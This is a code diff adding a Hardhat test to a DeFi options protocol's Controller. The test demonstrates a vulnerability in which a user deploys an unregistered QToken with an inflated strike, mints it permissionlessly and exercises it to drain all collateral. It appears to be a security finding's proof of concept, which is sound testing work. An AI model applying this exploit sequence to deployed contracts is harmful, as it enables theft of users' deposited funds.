@@ -23,6 +23,7 @@ import {
 import { CollateralToken } from "../typechain/CollateralToken";
 import { Controller } from "../typechain/Controller";
 import { ControllerV2 } from "../typechain/ControllerV2";
+import { ExternalQToken } from "../typechain/ExternalQToken";
 import { MockERC20 } from "../typechain/MockERC20";
 import { QToken } from "../typechain/QToken";
 import { QuantConfig } from "../typechain/QuantConfig";
@@ -926,6 +927,116 @@ describe("Controller", async () => {
         ethers.utils.id("priceRegistry"),
         mockPriceRegistry.address
       );
+  });
+
+  it("QTokens that are not created through the OptionsFactory are currently able to be exercised", async () => {
+    const optionsAmount = ethers.utils.parseEther("15");
+
+    // Take a snapshot of the Hardhat Network
+    const snapshotId = await takeSnapshot();
+
+    // Simulate some user minting real options through the Controller
+    // (i.e., QTokens that were created with the OptionsFactory createOption method)
+    const mintActions = [
+      encodeMintOptionArgs({
+        to: deployer.address,
+        qToken: qTokenPut1400.address,
+        amount: optionsAmount.toString(),
+      }),
+      encodeMintOptionArgs({
+        to: deployer.address,
+        qToken: qTokenPut400.address,
+        amount: optionsAmount.toString(),
+      }),
+    ];
+    const [, firstCollateralAmount] = await getCollateralRequirement(
+      qTokenPut1400,
+      nullQToken,
+      optionsAmount
+    );
+    const [, secondCollateralRequirement] = await getCollateralRequirement(
+      qTokenPut400,
+      nullQToken,
+      optionsAmount
+    );
+    const totalCollateralRequirement = firstCollateralAmount.add(
+      secondCollateralRequirement
+    );
+    const collateral = USDC;
+    await collateral
+      .connect(assetsRegistryManager)
+      .mint(deployer.address, totalCollateralRequirement);
+    await collateral
+      .connect(deployer)
+      .approve(controller.address, totalCollateralRequirement);
+    await controller.connect(deployer).operate(mintActions);
+    expect(await USDC.balanceOf(controller.address)).to.equal(
+      totalCollateralRequirement
+    );
+    expect(await qTokenPut1400.balanceOf(deployer.address)).to.equal(
+      optionsAmount
+    );
+
+    expect(await qTokenPut400.balanceOf(deployer.address)).to.equal(
+      optionsAmount
+    );
+
+    // Now we simulate the first option (PUT 1400) expiring ITM
+    await provider.send("evm_mine", [futureTimestamp + 3600]);
+    await mockPriceRegistry.mock.hasSettlementPrice.returns(true);
+    await mockPriceRegistry.mock.getSettlementPriceWithDecimals.returns([
+      ethers.utils.parseUnits("800", 8), // Chainlink ETH/USD oracle has 8 decimals
+      BigNumber.from(8),
+    ]);
+
+    // A user now comes and deploy a contract that adheres to the IQToken interface,
+    // or that simply inherits from the QToken contrac
+    const ExternalQToken = await ethers.getContractFactory("ExternalQToken");
+    const externalStrikePrice = ethers.utils.parseUnits(
+      "2600",
+      await USDC.decimals()
+    );
+    const externalQToken = <ExternalQToken>(
+      await ExternalQToken.connect(secondAccount).deploy(
+        await qTokenPut1400.quantConfig(),
+        await qTokenPut1400.underlyingAsset(),
+        await qTokenPut400.strikeAsset(),
+        await qTokenPut1400.oracle(),
+        externalStrikePrice,
+        await qTokenPut1400.expiryTime(),
+        await qTokenPut400.isCall()
+      )
+    );
+
+    // He then mints some of his new, malicious QToken
+    await externalQToken
+      .connect(secondAccount)
+      .permissionlessMint(secondAccount.address, optionsAmount);
+
+    // Which should be enough to drain all the funds in the Controller after exercising
+    const payoutAmount = (
+      await quantCalculator.getExercisePayout(
+        externalQToken.address,
+        optionsAmount
+      )
+    ).payoutAmount;
+    expect(await collateral.balanceOf(controller.address)).to.equal(
+      payoutAmount
+    );
+
+    // With the current Controller implementation, the malicious user should be able
+    // to exercise his external QToken, draining all the funds in the Controller
+    const exerciseAction = encodeExerciseArgs({
+      qToken: externalQToken.address,
+      amount: optionsAmount.toString(),
+    });
+    await controller.connect(secondAccount).operate([exerciseAction]);
+    expect(await collateral.balanceOf(controller.address)).to.equal(Zero);
+    expect(await collateral.balanceOf(secondAccount.address))
+      .to.equal(payoutAmount)
+      .to.equal(totalCollateralRequirement);
+
+    revertToSnapshot(snapshotId);
   });
 
   describe("neutralizePosition", () => {
